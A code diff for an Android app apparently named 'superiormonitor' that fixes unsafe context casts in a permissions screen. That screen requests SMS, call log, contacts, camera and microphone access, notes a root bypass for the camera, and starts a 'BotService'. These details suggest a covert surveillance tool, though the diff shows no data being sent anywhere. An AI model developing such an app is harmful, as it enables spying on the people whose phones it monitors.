@@ -43,6 +43,12 @@ import com.system.superiormonitor.util.LogCategory
 import com.system.superiormonitor.theme.*
 import kotlinx.coroutines.launch
 
+fun Context.findActivity(): ComponentActivity? = when (this) {
+    is ComponentActivity -> this
+    is android.content.ContextWrapper -> baseContext.findActivity()
+    else -> null
+}
+
 enum class NavScreen(val title: String, val icon: ImageVector) {
     Dashboard("Dashboard", Icons.Filled.Dashboard),
     Permissions("Permissions", Icons.Filled.Shield),
@@ -118,25 +124,31 @@ fun AppScreen(
         PermissionState("Display Over Other Apps", permissionStatus.hasSystemAlertWindow) { context.startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:${context.packageName}"))) },
         PermissionState("Ignore Battery Optimizations", permissionStatus.hasIgnoreBattery) { context.startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:${context.packageName}"))) },
         PermissionState("Call Access", permissionStatus.hasCallAccess) {
-            ActivityCompat.requestPermissions(
-                context as ComponentActivity,
-                arrayOf(Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_PHONE_STATE),
-                1001
-            )
+            context.findActivity()?.let { activity ->
+                ActivityCompat.requestPermissions(
+                    activity,
+                    arrayOf(Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_PHONE_STATE),
+                    1001
+                )
+            }
         },
         PermissionState("SMS Access", permissionStatus.hasSmsAccess) {
-            ActivityCompat.requestPermissions(
-                context as ComponentActivity,
-                arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS),
-                1002
-            )
+            context.findActivity()?.let { activity ->
+                ActivityCompat.requestPermissions(
+                    activity,
+                    arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS),
+                    1002
+                )
+            }
         },
         PermissionState("Contacts Access", permissionStatus.hasContactsAccess) {
-            ActivityCompat.requestPermissions(
-                context as ComponentActivity,
-                arrayOf(Manifest.permission.READ_CONTACTS),
-                1003
-            )
+            context.findActivity()?.let { activity ->
+                ActivityCompat.requestPermissions(
+                    activity,
+                    arrayOf(Manifest.permission.READ_CONTACTS),
+                    1003
+                )
+            }
         },
         PermissionState(
             name = "Camera Access",
@@ -144,22 +156,26 @@ fun AppScreen(
             displayStatus = if (!permissionStatus.hasCameraAccess && permissionStatus.hasRoot) "Bypassed via Root" else null
         ) {
             try {
-                ActivityCompat.requestPermissions(
-                    context as ComponentActivity,
-                    arrayOf(Manifest.permission.CAMERA, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE),
-                    1004
-                )
+                context.findActivity()?.let { activity ->
+                    ActivityCompat.requestPermissions(
+                        activity,
+                        arrayOf(Manifest.permission.CAMERA, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE),
+                        1004
+                    )
+                }
             } catch (e: Exception) {
                 // Ignore if framework throws exception when requesting permissions
             }
         },
         PermissionState("Microphone Access", permissionStatus.hasMicrophoneAccess) {
             try {
-                ActivityCompat.requestPermissions(
-                    context as ComponentActivity,
-                    arrayOf(Manifest.permission.RECORD_AUDIO),
-                    1005
-                )
+                context.findActivity()?.let { activity ->
+                    ActivityCompat.requestPermissions(
+                        activity,
+                        arrayOf(Manifest.permission.RECORD_AUDIO),
+                        1005
+                    )
+                }
             } catch (e: Exception) {
                 // Ignore
             }
@@ -356,7 +372,7 @@ fun AppScreen(
                                                 if (!permissionStatus.hasCameraAccess && !permissionStatus.hasRoot) missing.add("CameraAccess")
                                                 if (!permissionStatus.hasWriteSettings) missing.add("WriteSettings")
                                                 val msg = "❌ Missing: ${missing.joinToString()}"
-                                                LogManager.log(LogCategory.CORE, msg)
+                                                LogManager.log(LogCategory.SYSTEM, msg)
                                                 scope.launch { snackbarHostState.showSnackbar(msg) }
                                             } else {
                                                 context.startForegroundService(Intent(context, BotService::class.java))
